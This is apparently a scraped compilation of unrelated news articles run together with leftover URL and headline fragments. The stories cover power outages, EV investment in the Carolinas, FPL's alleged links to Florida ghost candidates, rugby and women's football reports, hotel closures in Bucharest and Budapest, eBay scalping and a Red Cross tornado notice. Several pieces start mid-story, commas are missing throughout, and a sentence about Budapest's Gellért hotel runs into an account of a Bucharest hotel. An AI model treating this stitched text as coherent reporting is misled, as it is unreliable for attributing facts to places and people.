As of Sunday afternoon more than 150000 Michiganders are without power. According to DTE Energy of Detroit MI the company has deployed more than 2000 field team members hoping to bring power to 80%-90% of its consumers by Sunday evening.

In New York wind gusts of up to 55 mph were reported around Albany. Also as of Sunday afternoon about 79000 New Yorkers are without power.

Is it time to add electric vehicles to the list? Two economic development announcements this week suggest the answer is yes.

On Monday Japanese automaker Toyota announced plans to build a $1.29 billion electric vehicle battery plant in Randolph County south of Greensboro. The plant is Toyota's first in North America as it tries to catch up with other automakers in the EV business. It comes with at least 1750 jobs.

The same day British electric vehicle maker Arrival unveiled plans to expand its presence in the Carolinas by building an $11.5 million battery assembly plant in Charlotte. The company already has its North American headquarters in Charlotte's South End an electric van assembly plant in the city and an electric bus factory in nearby Rock Hill South Carolina.

Announcements like these are starting to add up. Even before this week's news the two states had already attracted dozens of companies that supply the electric vehicle market — from raw materials like lithium for batteries to vehicles themselves.

That's prompting a bit of bragging. At the Toyota announcement Monday Gov. Roy Cooper predicted ""the world will look at North Carolina as a hub of clean energy and clean energy jobs.""

Research confirms that the EV industry is expanding across the Carolinas from the Research Triangle in North Carolina to Greenville and Spartanburg in South Carolina.

The Environmental Defense Fund has been tracking growth of the electric vehicle industry since 2014 and lobbying for policies to boost it. According to data EDF gathered with the help of consulting firm PWC here's how the numbers stack up not including this week's announcements.



North Carolina had 39 EV-related companies with 11564 employees around the state. Announced investments totaled nearly $1.2 billion before the Toyota deal. They include the planned Piedmont Lithium mine and processing operation near Bessemer City Daimler Trucks plants in High Point and Mount Holly and Linamar's electric motor plants in Wilson and Fletcher.

South Carolina had 19 companies with 8722 employees and total announced investments of $419 million. That includes battery and component makers electric motor suppliers and vehicle assembly operations like the Daimler Mercedes-Benz van plant in and the Arrival bus assembly plant under construction in Rock Hill. And BMW has said it plans to build electric vehicles at its plant in Spartanburg.

Environmental Defense Fundn Tim O'Connor

Tim O'Connor a senior director with the Environmental Defense Fund said this week that with all the investment so far North Carolina in particular may be well positioned to attract more business as demand for electric vehicles keeps growing.

""North Carolina really is at the opportunity stage to be able to capitalize on that investment and growth in demand more so than many other states in the U.S."" O'Connor said.

The Charlotte Regional Business Alliance the area's primary business recruiter sees lots of opportunities ahead.

""We're excited because this is the future and it's happening here in our backyard"" said Kelly O'Brien the alliance's chief advocacy and strategy officer.

Added Antony Burton a researcher at the alliance: ""These types of announcements develop momentum that can build upon and help grow the cluster moving forward.""

Besides having existing businesses in the EV sector the region has ""strong infrastructure a low cost of doing business and a good workforce education system.""

North Carolina Sustainable Energy Association Ward Lenz

Both states also are spending millions of dollars on tax rebates and other incentives to help lure companies to the region. This week's Toyota deal came with $430 million in state and local incentives with more possible if the company expands according to The Associated Press .

Officials said the Toyota announcement came after four years of recruiting. The plant will be built on what's called the Randolph Megasite — a piece of land that the state has been marketing to industrial companies for many years. Competition with other states is fierce said Ward Lenz executive director of the North Carolina Sustainable Energy Association.

""We've missed out on a few opportunities over the years” Lenz said. “And that's why (Toyota) is such a great announcement that we're starting to land those and getting more and more of those.

""The Arrival announcement and then a Toyota announcement on the same day are really going to help that market and help North Carolina continue to recruit companies like that.”

David Boraks / WFAE Lynn Good CEO of Duke Energy speaks to reporters at Charlotte Regional Business Alliance annual outlook on Dec. 8 2021.

The week's news and the growth of the EV supply chain in North Carolina have not escaped the attention of the region's biggest energy producer Duke Energy. In an interview this week at the Charlotte Regional Business Alliance's annual outlook CEO Lynn Good said the industry has ""a lot of potential"" here.

""There's so much energy infrastructure here around not only EVs but the energy industry that there's a real possibility there"" Good said.

And electric-powered vehicles may not be the only part of this weave. Good also said Duke Energy is studying the possibility of building a ""hydrogen hub"" somewhere in the Carolinas. That could mean a research and development facility to help foster the development and adoption of hydrogen-powered vehicles here and across the country. Someone has to build all those hydrogen refueling stations.

José Javier Rodríguez a Democrat.

According to investigators Artiles reportedly paid an auto salesman with the same surname as Rodríguez to run as a third-party ""ghost"" candidate against Rodríguez and his then-Republican challenger state Sen. Ileana Garcia. Farcical as it sounds it worked. The auto salesman despite never campaigning likely siphoned off 6300 votes from Rodríguez's re-campaign to ensure Garcia's victory.

Now new revelations suggest that Artiles the alleged mastermind may have just been the tip of the iceberg.

This week the Orlando Sentinel reported that there was likely an entire ecosystem of corporate and political entities propping up sham candidates in the 2020 Florida state Senate races. Records reviewed by the Sentinel indicate that Florida Power & Light (FPL) the country's largest electricity company helped coordinate three separate ghost candidates – one of whom was Rodríguez – in order to bolster its own business interests in the state legislature. From 2016 to 2020 FPL reportedly made a series of transactions totaling over $3 million to Denver-based dark-money nonprofit ""Grow United"" whose name was changed from ""Proclivity"" last year. In October of 2020 Grow United gifted two Florida political committees – ""The Truth"" and ""Our Florida"" – with $550000 to finance the mass delivery of political mailers supporting three unaffiliated candidates in three districts. Thousands of these mailers – all of which featured identical language blasting ""party line"" politicians as ""puppets"" according to Politico – bombarded voters.

It was ""a coordinated dark money effort to siphon votes from Democratic candidates"" Anders Croy a Democratic caucus' spokesman told The Miami Herald.

According to the Sentinel  a printing company with ties to Florida GOP strategist Alex Alvarado was in charge of producing the mailers themselves. Incidentally Alvarado's data intelligence firm was paid hundreds of thousands of dollars by political groups with ties to Associated Industries of Florida a business lobbying group that represents FPL.

Alissa Jean Schafer a research and communications manager at the Energy and Policy Institute (EPI) a utilities and energy watchdog told Salon that FPL's presence in this opaque web of nonprofits companies and political committees is completely unsurprising.

""It's a huge opportunity for FPL given the political landscape to flex their political power on spending important relationship-building and direct political contributions before you even get to the stuff where it's a little bit more shady and buried in levels of political committees"" Schafer said in an interview. ""If you look at the comments that the company makes for example in their quarterly reports they talk about Florida as being a friendly regulatory environment. And that is very intentional. It's a result of the work that they have done to control the political environment.""

RELATED: Florida's largest power company made installing solar panels much harder

Schafer who has been following FPL's apparent skullduggery for several years now noted that the company has several levers of power when it comes to keeping Florida's legislature on the side of businesses rather than consumers.

One lever is exerting influence over the Florida Public Service Commission (FPSC) a five-member panel tasked with regulating the business practices of utility and telecommunications corporations throughout the state. A large part of FPSC's job is to keep FPL in check because the company has a monopoly on the state's utilities market. This is why the FPSC decides what rates the company is allowed to fairly charge its customers – a process that involves extensive accounting of the company's yearly costs.

Throughout 2019 and 2020 the FPSC approved numerous rate increases for FPL Tampa Electric Co. and Duke Energy. Just this week the FPSC likewise voted to let FPL collect an additional $810 million from customers in 2022 to account for the increasing cost of natural gas nationwide. According to The Daily Herald  FPL intends to increase the cost of electricity for its customers by roughly 20% over the next four years.

While there have been some instances in which the commission sides with consumers it's hard to argue that the FPSC is insulated from corporate interests. After all its five commissioners are appointed by the governor and confirmed by the state Senate which makes its composition a product of politics Liz Veazey Policy and Rural Energy Director at Solar United Neighbors told Salon.

""When you're solely focused on profits over people there's no limit to what utility companies will do to preserve their energy monopoly"" Veazey told Salon by email. ""The substantial influence that FPL and Duke Energy have over the state legislators and the governor … reduce[s] the ability of the government to fulfill its oversight role.""

On top of lobbying companies like FPL can also launder their interests through more public channels of campaign finance. For instance while Florida prohibits utilities companies from donating directly to candidates they can contribute to political action committees that align with business-friendly candidates.

According to The Sentinel in 2018 alone FPL made $8 million in campaign contributions to political action committees. But donations like these Veazey said ""are often only half of the story and fail to include all of the monies creatively funneled through political committees political parties and even charitable donations.""

FPL for its part has vehemently denied any suggestions that it financially supported ghost candidates.

""Neither FPL nor our employees provided funding or asked any third party to provide funding on its behalf to Grow United in support of Florida state-level political campaigns during the 2020 election cycle"" company spokesperson David P. Reuter told the Sentinel. ""Any report or suggestion that we had involvement in financially supported or directed others to support any 'ghost' candidates during the 2020 election cycle is patently false and we have found absolutely no evidence of any legal wrongdoing by FPL or its employees.""

RELATED: Florida protects solar: 5 lessons to learn from a major green energy win

Veazey told Salon that she found Reuter's statement ""elitist"" and ""absurd.""

""Their claim of ignorance of how the money was being spent is not an acceptable excuse for their funds being used to wreak havoc on the democratic process"" she added.

It isn't the first time that FPL has come under scrutiny for indirectly financing alleged sham candidates.

In 2018 Florida state Sen. Keith Perry a Republican won re-election against Democratic challenger Kayser Enneking largely due to the candidacy of independent Charles Goston. According to the Sentinel FPL donated $14.15 million to a political ad nonprofit whose consultants were affiliated with a group that paid for ads supporting Goston.

As curious as FPL's charitable decisions are it's not hard to see why an electricity retailer would get involved in political funding. FPL is facing a push for rooftop solar. Earlier this year state Democrats introduced a bill that would have saved schools businesses and nonprofit organizations from paying millions of dollars in up-front costs associated with solar installation. Solar United estimated that bill would have added 25000 new jobs with $4 billion in economic growth. In the end however the measure didn't even receive a hearing in the Republican-controlled legislature.

RELATED: Florida abandons clean energy: State votes to gut efficiency goals and end rooftop solar rebates

FPL and solar advocates have also locked horns over net metering a billing mechanism that allows solar users to collect credits for energy they generate but do not use. Currently net metering is legal in the Sunshine State. But that hasn't stopped Republicans from waging disinformation campaigns that overstate the costs associated with solar. ""Utilities are also actively working to spread disinformation about the benefits of solar imposing outrageous interconnection fees misrepresenting community solar imposing unfair minimum-monthly bills on solar customers and blocking policies that keep solar affordable and accessible"" Veazey explained.

Part of the problem with holding utility companies accountable Schafer said is that they're playing the long game. Thus connecting something like FPL's stance on net metering to their alleged support of ghost candidates involves untangling convoluted political projects spanning years.

""The process of putting [the] pieces together and understanding this web of dark money non-profits and entities shuffling money back and forth – that is very challenging to keep track of"" Schafer said. ""A lot of people say 'I don't get that stuff that's why I don't like politics.' But that sentiment right there is one of the things utilities companies are counting on. They know that it's confusing. They know that it's overwhelming. Most people just want to switch the light switch and have their lights on."""

AFP

France scrum-half Antoine Dupont celebrated being named World Player of the Year with a try as Toulouse won 39-7 at Cardiff in the European Champions Cup on Saturday.

Less than 24 hours after he was presented with the award Dupont also set up three tries as the holders started the defence of their record fifth European crown.

The home side fielded a third-string side because 32 players had to isolate after the team returned from South Africa earlier this month.

“We knew they lacked players but we also knew they had a lot of very good players we prepared seriously” Dupont told Channel 4.

“The result is good but they were good also” he added.

Cardiff’s fellow Welsh region the Scarlets decided to forfeit their weekend fixture against the Bristol Bears after also being caught by Britain’s changing quarantine rules.

At the Arms Park the hosts including academy members and semi-professional players trailed 6-0 after a quarter of an hour following two Romain Ntamack penalties.

The vocal home crowd were fired up and had reason to cheer on the 20-minute mark as Wales three-quarter Josh Adams went over under the sticks and Cardiff led 7-6.

The tie turned on its head before the break with two clinical Dupont interventions as the half-back’s breaks set-up Anthony Jelonch and Pita Ahki.

Toulouse were held at 20-7 by the home team’s committed defence before Dupont’s best contribution.

He broke off the back of a lineout from 30m out and beat four would-be tacklers to dive over.

The 25-year-old capped his display with a sublime low cross-kick to gift winger Arthur Bonneval a try that secured the bonus point. Dupont was then replaced with 13 minutes to play.

Cardiff finished with 14-men after 20-year-old full-back Jacob Beetham was shown a red card for a dangerous tackle on his senior debut before former Samoa lock Joe Tekori crossed for Toulouse’s fifth try with four minutes left.

France halfback Antoine Dupont has been named World Rugby's Men's Player of the Year.

The 25-year-old Dupont became the third Frenchman to win the award after Fabien Galthie currently the national team coach in 2012 and flanker Thierry Dusautoir in 2011.

Dupont beat Australian duo Michael Hooper and Samu Kerevi and England lock Maro Itoje to the award which was determined by a vote from fans after impressing for France and helping Toulouse to the Champions Cup and French Top 14 double.

England lock Zoe Aldcroft won the women's award after starting all eight of England's matches this year and helped them win a third successive Six Nations title.

The 25-year-old captained the Red Roses for the first time last month as they crushed the United States 89-0.

The 25-year-old France scrum-half and skipper has been instrumental to the form of a vastly-improved national side. A deft passer of the ball and fast off the mark Dupont’s supreme covering and support play saw him cross for three tries in last season’s Six Nations. Handed the captain’s armband for the November Tests he led France to three wins including a first over New Zealand (40-25) on home soil since 2000. Dupont saw off competition for the award from Australians Michael Hooper and Samu Kerevi and England and British & Irish Lions lock Maro Itoje. “It’s hard to believe” said the player who also helped his club Toulouse to Top 14 and European Champions Cup titles last season. “Of course there’s an enormous amount of joy and pride many feelings and emotions that are all mixed up.” Dupont added: “It’s strange to see my name in this list… Looking ahead you have to do everything to be able to claim it again and continue to perform all the time.”,https://news.google.com/articles/CBMiUmh0dHBzOi8vd3d3LndydS53YWxlcy9yZXBvcnQvY2FyZGlmZi1naXZlLWl0LWV2ZXJ5dGhpbmctYnV0LWR1cG9udC1oYXMtbGFzdC1sYXVnaC_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Cardiff give it everything but Dupont has last laugh,"WRU Newsletter

Despite being without no fewer than 42 players through Covid quarantine injury or suspension the Welsh region managed to fulfil the fixture by calling on Academy youngsters and semi-pros.

And against all the odds they took a shock lead midway through the first-half through a touchdown from Wales wing Josh Adams who was playing in the centre.

In the end the class of France scrum-half Dupont told as he set up three tries and scored a cracker of his own to guide the Champions Cup holders to a bonus point victory.

But the makeshift Cardiff side can be proud of their efforts with skipper Ellis Jenkins leading by example from the back row.

In front of a packed Arms Park they really got into the faces of the French aristocrats in the first half with their rush defence putting the pressure on and forcing mistakes.

Then when they had the ball they looked to put it through the hands and get it wide whenever possible.

There were problems at the scrum as was to be expected with a series of offences helping the visitors establish a 6-0 buffer.

But then on 21 minutes there was delight around the ground as the hosts went in front with a converted try from Adams.

His co-centre Willis Halaholo sets up the attacking position as his perfectly placed kick through forced Maxime Medard to boot the ball dead under pressure from Jacob Beetham and Theo Cabango.

The resulting five metre scrum held firm and when the ball was moved left into midfield Adams hit a great line to take a fired Tomos Williams pass from a ruck and go in under the posts.

But that was the cue for Dupont to show just why he has been crowned the best player on the planet.

He produced two devastating breaks from deep to pave the way for tries for flanker Anthony Jelonch and centre Pita Ahki that gave his team a 20-7 lead.

Then he mustered a fine solo effort of his own delivering a couple of hand-offs to burst away to the whitewash after pocketing the ball at the tail of a lineout.

He rounded off his afternoon’s work with a pin-point cross kick right into the arms of Arthur Bonneval enabling the winger to cross unopposed.

Is there nothing the man can not do?

There was a late red card for young full-back Beetham for a shoulder to the head in a tackle which was followed by a fifth Toulouse try through replacement lock Joe Tekori.

So a convincing win for the holders but the Cardiff players can hold their heads high with the ovation they received from the 10000 crowd as they left the field speaking volumes for their efforts.

In Budapest meanwhile the historic Gellért hotel is closing its doors for much-needed renovation.

It was Bucharest’s first skyscraper of any real height and for more than 30 years the tallest building in the Romanian capital. During the Romanian Revolution of December 1989 the hotel was the preferred base of the foreign press.

The pictures they recorded of fighting on the square below were sent all over the world and heralded the end of the Nicolae Ceaușescu regime.

But from January 1 2022 the Bucharest InterContinental will no longer be an InterContinental hotel instead becoming the Grand Hotel Bucharest. It will remain open while undergoing renovation according to its owners – ironically still known as the InterContintental Romania Hotel Company – who plan to spend up to 21 million euros over the next two years on modernisation.

The story of Bucharest’s InterContinental begins in the 1960s when Cyrus Eaton Jr – representing the Cyrus Eaton Corporation – arrived in the city. There were few luxury hotels in Bucharest in those days and legend has it he ended up sleeping in a hotel lobby after failing to find any suitable accommodation.

Eaton Jr – who had a talent for cutting through red tape – would go on to make something of a career out of opening hotels in socialist countries during the 1970s including the Sheraton Grand Balkan in Sofia (now known as the Sofia Hotel Balkan).

Construction of the Bucharest InterContinental started in 1968 following the designs of four Romanian architects: Dinu Hariton Gheorghe Nădrag Ion Moscu and Romeo Belea; the project also included the building of the National Theatre itself renovated a decade ago.

“It was the favourable political conditions of the 1960s which made it possible for the InterContinental chain to open a hotel in Romania” according to Belea speaking in an interview some years ago to mark the hotel’s 40th birthday.

Romania at the time was enjoying a brief period of liberalisation under Ceaușescu fêted by western governments for his refusal to join the Warsaw Pact invasion of Czechoslovakia that crushed 1968’s Prague Spring.

The hotel 86 metres tall and boasting a swimming pool on the 22nd floor opened in May 1971: its first guests were a group of American tourists were brought to the Romanian capital on the first Pan Am flight to land in Bucharest.

Gellért hotel closes but its sumptuous baths remain open

In the Hungarian capital Budapest the equally iconic and imposing – if not more so – Gellért hotel closed its doors to guests on December 1 although the thermal bath complex at the rear of the hotel continues to operate.

Once the most luxurious hotel in the city the Gellért had in recent years become a shadow of its former self as if trapped in a 1970s time warp: its last major renovation had been in 1973.

Construction of the Secessionist and Art Deco masterpiece – designed by Hungarian architects Ármin Hegedűs Artúr Sebestyén and Izidor Sterk – began in 1912 but with work halted for much of World War I it did not open until September 1918.

The hotel quickly became the preferred venue of Budapest’s smart set hosting extravagant balls royalty and stars of stage and the silver screen throughout the 1920s and 1930s. Badly damaged during World War II it was not fully reconstructed until 1957.

The hotel was itself a star of the 1981 Oscar-winning film Mephisto directed by Hungarian István Szabó as well as the more forgettable 2001 film I Spy with Eddie Murphy and Owen Wilson.

Fortunately the Gellért thermal baths arguably the finest of all the great bath houses in Budapest complete with an impossibly elegant main swimming pool will remain open while the hotel is renovated.

What we will miss out on until the hotel reopens are its unique Gellért rolls made in the on-site patisserie and filled with chocolate cream and rum.

With Leigh Dugmore returning to the starting eleven the Baggies were keen to get back to winning ways after a frustrating penalty shootout defeat to Cheltenham Town last weekend.

And it took them just two minutes to take the lead. An in-swinging corner from Shannon Stamps was half-cleared to Evie Gallop on the edge of the area and she controlled it well before smashing home a spectacular volley.

A few moments later Gallop caught the Long Eaton defence napping again when she capitalised on a loose ball running through on goal and slotting comfortably into the bottom corner.

Albion’s No.10 was running the show and the opposition had no reply. Albion’s dominance earned them a third just before the break when Poppy Bastock’s goal-kick was taken down the line by Stamps who crossed for Leigh Dugmore to finish at close-range.

The second half saw more of the same from Albion. A strong penalty shout on Kerry Walklett was waved away by the referee but she was soon able to make it four when the hosts dispossessed Long Eaton’s free kick and Stamps’ shot was spilled for the midfielder to convert.

United pulled one back when a long pass found its way to the back-post and Hicks tapped it into an empty net yet the Baggies wasted no time in restoring the four-goal lead. Gallop did brilliantly to keep a good move alive and fire a cross across the face of goal giving Walklett the simplest of tap-ins to grab her side’s fifth.

Women’s Super League clubs including holders Chelsea enter the competition at the next round presenting a great chance for Albion to test themselves against the very best.

After the match Evie Gallop reflected on her goal beaming: “It’s got to be one of the best I’ve scored while here at West Brom.

“As soon as I won the ball back I was always going to try to take the shot on it fell kindly for me and it gave me an unreal feeling. To score a ‘worldie’ in the FA Cup is the stuff of dreams.”

Head Coach Jenny Sugarman was also full of praise for her team’s emphatic display.

""We’re really pleased with our performance today and that showed in the full time score” she said.

“We spoke midweek about needing to be more ruthless in front of goal something we didn’t do too well last week and they’ve taken that on board today. We created a lot of good chances and on the whole we did really well in taking them.”

Albion play in their final game before the festive break on Sunday in the next round of the Birmingham County Cup against Solihull Moors.

Skip has been a speaker at industry conferences and has written 14 books about selling on eBay Amazon and the Internet. As he explained “What makes our books different is we write about what we actually do.” Last month he made his retirement official and it feels like the end of an era.

For over two decades Skip and his wife Karen have been a reliable resource for sellers and for just as long they have been colleagues and friends to David and myself. After a few years of knowing them “online” I met them in person for the first time at the 2003 eBay Live conference in Orlando where they were exhibiting their resources for eBay sellers. Their daughter-in-law Lissa was a contributor to EcommerceBytes for several years and Skip carried David’s book “Snappy Auction Photos” in his catalog in what seems like eons ago.

Their generosity and spirit of collegiality is unmatched.

Skip and Karen have legions of followers whom they helped make a living and grow flourishing online businesses. Like many early eBay sellers they had a retail background having run an antique shop in upstate New York before venturing online (customers included the late Mary Tyler Moore Kevin Bacon and James Earl Jones). Skip who also had a successful career at a Fortune 100 company was one of the first eBay PowerSellers and continued to sell on eBay and Amazon which helped inform his content. By 2014 Amazon made up 80% of their business and eBay had fallen to 20%. Eventually they put all their selling efforts into their Amazon business while continuing to publish their newsletter blog and books.

In a recent phone call we reminisced about the early days of ecommerce and joked about the joys and pitfalls of running a business with a spouse. Karen told me when she recently called her payment processing company to close the account the man on the other end of the line was a customer of theirs who had purchased one of Skip’s books years ago as an aspiring eBay seller. It was a sign that their influence remains everywhere.

In signing off in his last blog post Skip thanked his readers and wished them continued success and wrote “Remember the only thing standing between you and achieving your goals is you.”

I’m sure there are many readers who join us in congratulating Skip and Karen and who are perhaps just a teensy bit jealous of them as they look forward to spending more time with their grandkids and canines.

Keep in touch Skip McGrath!",https://news.google.com/articles/CBMieGh0dHBzOi8vd3d3LmNhcnNjb29wcy5jb20vMjAyMS8xMi9zY2FscGVycy1zY2FscGVycy1ldmVyeXdoZXJlLXRlc2xhcy1raWRzLWN5YmVycXVhZC1mb3Ita2lkcy1oaXRzLWViYXktZm9yLXVwLXRvLTE3MDAwL9IBAA?hl=en-US&gl=US&ceid=US%3Aen,Scalpers Scalpers Everywhere: Tesla's Cyberquad For Kids Hits eBay For Up To $17000,"Few things grind my gears more than scalpers and just a few days after Tesla launched its Cyberquad for Kids some of those fortunate enough to secure an order are already looking to flip the electric ATV online.

A search on eBay reveals dozens of listings for the ATV from those that secured an order and are expected to take delivery in the coming weeks. Tesla briefly sold the Cyberquad for Kids priced at $1900 but you’d be hard-pressed to find one online for anything less than double that.

Some individuals with orders are running auctions for the ATV while others have listed their orders as ‘Buy It Now.’ The most expensive we’ve come across has a Buy It Now or Best Offer listing priced at an absurd $17000 almost 10 times the original asking price. There is also one listed on eBay with a Buy It Now price of $12900.

Most of the Cyberquad for Kids listed on eBay range from $4000 to $6000 which is still upwards of three times the quad’s original price. That’s almost like trying to sell a base model Tesla Model 3 for $100000.

Driving the Cyberquad for Kids is a 36-volt lithium-ion battery pack that’s good for 15 miles (24 km) of range. The ATV can also hit up to 10 mph (16 km/h) and can be fully recharged through a household socket in five hours. It will presumably be followed up by a full-size variant targeted towards adults and launched at a similar time to the Cybertruck.",https://news.google.com/articles/CBMiZGh0dHBzOi8vd3d3LnNmY2hyb25pY2xlLmNvbS9iYXlhcmVhL2FydGljbGUvd2hlcmUtZG9lcy1tZXJjaGFuZGlzZS1zdG9sZW4tZnJvbS1iYXktYXJlYS0xNjY4OTc3MC5waHDSAQA?hl=en-US&gl=US&ceid=US%3Aen,Where does stolen Bay Area merchandise go?

Thousands of people lined up outside shops in Bristol to buy the limited edition tops - but many are already on sale for significantly more.

4 Thousands of people queued up in Bristol to get their hands on one of the tops

Five stores across the city were each selling several hundred of the grey souvenir shirts in aid of four people facing trial in relation to the toppling of a statue of slave trader Edward Colston during last year's Black Lives Matter protests.

The shirts have a picture of Colston's empty plinth with a rope hanging off with debris and a discarded sign nearby.

'Bristol' is written above the image in Banksy's signature graffiti style.

The world-renowned artist said proceeds from the sales would be given to the four people facing trial next week accused of criminal damage.

In a post on Instagram he said: ""Next week the four people charged with pulling down Colston's statue in Bristol are going on trial.

""I've made some souvenir shirts to mark the occasion. Available from various outlets in the city from tomorrow.

""All proceeds to the defendants so they can go for a pint.""

Bristol-based Banksy said sales would be limited to one per person and each T-shirt would cost around £25.

But within hours of the shirts being purchased listings for them eBay started to appear.

Some are marketed at a few hundred pounds each but some cost as much as £2000 and one is up for a staggering £9000 - 360 times the original price.

The names of the five shops - Frontline Video in St Paul's Hakuna Matata That Thing Friendly Recs and Rough Trade - were announced on Saturday by local radio station Ujima Radio.

Hundreds of people queued outside the Rough Trade record shop in Bristol.

Among them were brother and sister Tom and Rosie Levins.

""When we got in the queue I don't think we were really confident"" Rosie said.

Her brother added: ""I collect all the Banksy stuff I can get hold off. When stuff comes up in Bristol and you get a chance...""

On Monday Rhian Graham 29 Milo Ponsford 25 Jake Skuse 36 and Sage Willoughby 21 face trial at Bristol Crown Court.

The bronze memorial to the 17th century slave merchant was pulled down during a Black Lives Matter protest on June 7 last year before being dumped in Bristol Harbour and later recovered by Bristol City Council.

Charges allege that the four defendants without lawful excuse jointly and with others damaged the statue of Edward Colston - a listed monument belonging to Bristol City Council.

It is claimed that the foursome committed the offence ""intending to destroy or damage such property or being reckless as to whether such property would be destroyed or damaged"".

The American Red Cross and our partners are working around the clock across multiple states to help those in need and make sure everyone has a safe place to stay food to eat critical relief supplies emotional support and comfort in the face of one of the most devastating tornado outbreaks in years.



At least 24 tornadoes ripped across six states in the dark of night impacting people in Arkansas Illinois Indiana Kentucky Missouri and Tennessee. Initial reports show that some communities have suffered significant damage with homes and buildings destroyed and hundreds of thousands of people left without power.



Several emergency shelters are open to provide comfort for people who can’t return home. As the weather clears Red Cross volunteers will be out in affected communities assessing the damage left behind to help determine the types of support people may need in the coming days and weeks.



THREAT NOT OVER The National Weather Service reports the severe weather continues today from the Ohio and Tennessee valleys to the northern Gulf States. As Red Cross workers respond to last night’s tornadoes we urge everyone who remains in the path of this ongoing severe weather system to listen to the advice of local officials and be ready to get to a safe place quickly in case of a tornado warning. Download the free Red Cross Emergency app for access to real-time information and safety tips. The Emergency app is available in app stores by searching for the American Red Cross or going to redcross.org/apps.



PLEASE GIVE BLOOD The Red Cross has provided more than 160 blood products to hospitals in response to these devastating tornadoes. We remain in touch with our hospital partners throughout affected areas and stand ready to provide additional blood products as needed. We also anticipate Red Cross blood drives in affected communities may be canceled or experience lower donor turnout in the coming days further challenging an already historically low blood supply.



YOU CAN HELP people affected by disasters like storms home fires and countless other crises by making a gift to Red Cross Disaster Relief. Those in areas unaffected by this tornado outbreak are urged to make an appointment today to give blood and ensure blood products are available for patients wherever the need arises.



Your donation is a commitment to helping people in need and every single contribution matters enabling the Red Cross to prepare for respond to and help people recover from disasters big and small. To make a financial donation or schedule an appointment to give blood or platelets visit redcross.org or call 800-RED CROSS. You can also use the Red Cross Blood Donor app or text the word REDCROSS to 90999 to make a $10 gift today.



CONNECT WITH A LOVED ONE If you are unable to locate someone who has been impacted by the storms call during off-peak hours for the best chance of getting through. Send a text message which may go through when phone calls cannot. You can also check your loved one’s social media pages or send an email. Call friends and relatives who may have already been in contact with your loved one or call people and places where your loved one is well-known; neighbors employer school place of worship senior center social club/center union or fraternal organization.



If your missing loved one is elderly has a functional or access needs suffers from a medical or mental condition or has difficulty understanding the English language you can reach out to your local Red Cross for assistance. If you lived with your missing loved one in the same home prior to the disaster but became separated or they are a member of the military community please reach out to your local Red Cross chapter for assistance.



AFTER A TORNADO (More tornado safety information available here.) Return to your neighborhood only when officials say it is safe to do so.

Keep children and pets away from hazardous sites and floodwaters.

If you have children leave them with a relative or friend while you conduct the first inspection of your home after the disaster.

Check the outside of your home before you enter. Look for loose power lines broken or damaged gas lines foundation cracks missing support beams and other damage. Ask a building inspector or contractor to check the structure before you enter.

If power lines are down outside your home don't step in puddles or standing water. Report them immediately to the power company.

Don't cut or walk past colored tape that was placed over doors or windows to mark damaged areas unless you've been told that it is safe to do so. If a building inspector has placed a color-coded sign on the home don't enter until you get more information advice and instructions from your local authorities.

If you smell gas or hear a hissing noise leave the property immediately and get far away from it. Call the fire department after you reach safety.

IF YOUR POWER IS OUT (More power outage safety information can be found here.). There are ways that you can minimize loss and keep everyone as comfortable as possible.

Use flashlights in the dark — not candles.

Don’t drive unless necessary. Traffic lights will be out and roads could be congested.

Turn off and unplug any appliances equipment and electronics. When the power comes back on surges or spikes can damage equipment.

Leave one light on so you’ll know when power is restored.

If a power outage is two hours or less don’t be concerned about losing perishable foods. During a prolonged outage keep refrigerator and freezer doors closed as much as possible to protect your food.

Use perishable food from the refrigerator first. Then use food from the freezer.

Perishable food is safe to eat when it has a temperature of 40 degrees Fahrenheit or below.

If the power outage will continue beyond a day prepare a cooler with ice for your freezer items. Keep food in a dry cool spot and cover it at all times.

If you are using a generator keep it dry and don’t use it in wet conditions.

Never use a generator grill camp stove or other gasoline propane natural gas or charcoal-burning device inside a home garage basement or other partially enclosed area. Keep this equipment outside and away from doors windows and vents which could allow carbon monoxide to come indoors.

Operate the generator on a dry surface under an open canopy-like structure such as under a tarp held up by poles. Don’t touch a generator with wet hands.

Turn the generator off and let it cool down before refueling. Gasoline spilled on hot engine parts could catch fire.

Plug appliances directly into the generator. Never plug a generator into a wall outlet.

COVID-19 has not changed the Red Cross mission. We are providing the same types of support we always have and ensuring people have a safe place to stay during disasters is a critical part of that support. How we support sheltering efforts may be different in each community depending on local emergency plans and the scale of the disaster.

Responding to disasters is a team effort and no single organization can do it alone — particularly in this current environment. To help keep everyone safe we’re using safety precautions including masks health screenings enhanced cleaning procedures and encouraging social distancing regardless of vaccine status.



The Red Cross helps anyone in need after a disaster and everyone is welcome in our shelters. We encourage people who plan to stay in a Red Cross shelter to bring prescription medications extra clothing pillows blankets hygiene supplies other comfort items and important documents. Don’t forget to bring any special items for children such as diapers formula and toys or for family members who have unique needs.

Hundreds of millions of views a barrage of new stars the creation of unexpected jobs rap materialized from an original side a hobby that became a business. Professional freestyle rap is one of the most amazing phenomena of the last decade. And it’s big business too.

“The launch of the league was the consolidation of our years of discourse” says Asier Fernández director and co-founder of Urban Roosters the most important freestyle platform in the Spanish-language (and probably the entire) world.

The Birth Of A Behemoth

Urban Roosters is the undisputed leader of the freestyle rap market in Latin America and Spain – and is already getting ready to conquer new markets including the U.S. However the task of Fernández and Pedro Henrique his partner was not easy: the friends built a media empire where there was hardly an emerging cultural scene.

Their main vehicle? The Freestyle Master Series a professional freestyle league that brings together the best MCs in the world a league that managed to articulate the jump of freestyle rap to a more sporty world: ordered syndicated hierarchized.

Like a kind of FIFA or NBA but for rap Urban Roosters manages FMS leagues in Spain Argentina Chile Mexico and Peru as well as an international league that faces the best rappers from each country.

And its strength partly derived from the generation of an invisible thread with the underground competitions: according to their relevance reach and trajectory each underground competition helps MCs accumulate points to one day get drafted to the highest category the Rap Champions League.

Rap As A Raw Material

""Both my partner and I are rappers"" says Asier.

Since the age of 15 Asier and his friends have been fans of freestyle. This love sealed an unbreakable routine: every Thursday they’d gather to improvise some bars.

“When I went to Madrid for work I had to leave that routine. But I thought: Why not continue practicing that hobby via the Internet? ”

This led Asier to design an online platform to battle alongside his friends no matter where they were.

“Pedro and I worked in an advertising agency. We launched this platform and with many years on the circuit we realized that to grow freestyle had to follow similar paths to skateboarding surfing or the UFC ”.

- Why skateboarding surfing and the UFC?

“Because fashions perish but sports don’t.”

""When working in advertising we came from creating campaigns for brands"" he continues. “That was our background and we didn't know anything about the business world. In 2011 we set up this project as a 'trucho' [a project created to be shown without commercial purposes] to sell our book and get a job.”

